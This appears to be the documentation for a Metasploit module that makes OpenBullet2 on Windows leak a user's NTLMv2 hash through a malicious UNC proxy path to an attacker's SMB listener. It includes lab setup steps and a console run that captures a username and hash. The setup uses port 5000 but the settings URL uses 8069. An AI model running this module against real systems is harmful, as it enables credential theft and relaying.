## Vulnerable Application

This Metasploit module exploits a Credential Disclosure vulnerability in OpenBullet2 on Windows.

An attacker can force the application to disclose the NTLMv2 hash of the process user by configuring a job proxy source with a malicious UNC path. When the job starts, the application attempts to load proxies from the specified path via SMB, allowing the hash to be captured for offline cracking or relaying.

The affected versions include releases from 0.2.5.

## Setup

### Windows

1. Download [OpenBullet2.Web-win-x64.zip](https://github.com/openbullet/OpenBullet2/releases/download/0.3.3.3093/OpenBullet2.Web-win-x64.zip) and unpack
2. Run
```
.\OpenBullet2.Web.exe --urls "http://0.0.0.0:5000"
```

### Set Authentication

Authentication is turned off by default.
You need to set it to check bypass.

1. Go to http://127.0.0.1:8069/settings
2. Click "Change admin password" and set any password
3. Turn "Require admin login" on
4. Save

## Scenario

```
msf > use scanner/http/openbullet2_unauth_hash_disclosure_cve_2026_39908
msf auxiliary(scanner/http/openbullet2_unauth_hash_disclosure_cve_2026_39908) > set SRVHOST eth0
SRVHOST => 192.168.19.153
msf auxiliary(scanner/http/openbullet2_unauth_hash_disclosure_cve_2026_39908) > set RHOST 192.168.19.154
RHOST => 192.168.19.154
msf auxiliary(scanner/http/openbullet2_unauth_hash_disclosure_cve_2026_39908) > set RPORT 5000
RPORT => 5000
msf auxiliary(scanner/http/openbullet2_unauth_hash_disclosure_cve_2026_39908) > run
[*] Running module against 192.168.19.154
[*] Running automatic check ("set AutoCheck false" to disable)
[*] OpenBullet2 Instance OS: Microsoft Windows NT 10.0.19044.0
[+] The target appears to be vulnerable. Detected version 0.3.3.3093, which is vulnerable
[*] Server is running. Listening on 192.168.19.153:445
[*] The SMB service has been started.
[*] Listening for hashes on 192.168.19.153:445
[SMB] NTLMv2-SSP Client     : 192.168.19.154
[SMB] NTLMv2-SSP Username   : DESKTOP-1E5TEED\admin
[SMB] NTLMv2-SSP Hash       : admin::DESKTOP-1E5TEED:[HASH]

[*] Server stopped.
[*] Auxiliary module execution completed
```